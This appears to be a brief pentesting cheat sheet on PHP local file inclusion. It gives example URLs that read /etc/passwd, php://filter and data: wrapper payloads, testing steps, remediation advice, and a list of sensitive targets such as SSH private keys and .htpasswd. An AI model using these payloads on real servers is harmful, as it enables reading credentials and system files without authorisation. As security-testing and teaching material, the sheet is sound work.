## PHP Vulnerable functions:

### Include_once()

### Include()

### require()

#### Example: http://site.com/index.php?file=/etc/passwd (Linux)

#### http://site.com/index.php?file=/windows/win.ini (Windows)

## LFI Testing

#### 1: GET,POST,COOKIE,HTTP header values

#### 2: Valid input to check web server behavior

#### 3: Invalid inputs

#### 4: Use burpsuite or browser address, not only forms

#### 5: Look for errors while entering invalid input to disclose the current path of the web app (trial and error)

#### 6: Understand input validation and check for filters

#### 7: Inject a valid entry to read sensitive files

## File Inclusion Remediation (Both LFI and RFI)

#### 1: Keep systems, services and web apps updated.

#### 2: Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.

#### 3: Web Application Firewall (WAF)

#### 4: Whitelist/Blacklist file names and locations

#### 5: Disable allow_url_fopen and allow_url_include (PHP)

#### 6: Input validation

#### 7: Allow only protocols and PHP wrappers in need.

### PHP WRAPPERS

#### 1) php://filter/convert.base64-encode/resource=.htaccess

#### 2) php://filter/string.rot13/resource=.htaccess

#### 3) php://filter/string.toupper/resource=.htaccess

#### 4) php://filter/string.tolower/resource=.htaccess

#### 5) php://filter/string.strip_tags/resource=.htaccess

### DATA WRAPPER 

#### data:text/plain,<?php phpinfo(); ?<

## Important files to look for:

#### 1) /etc/passwd

#### 2) /home/USER/.ssh/id_rsa

#### 3) /etc/apache2/sites-enabled/000-default.conf

#### 4) /var/www/html/config.php

#### 5) /var/www/html/.htpasswd
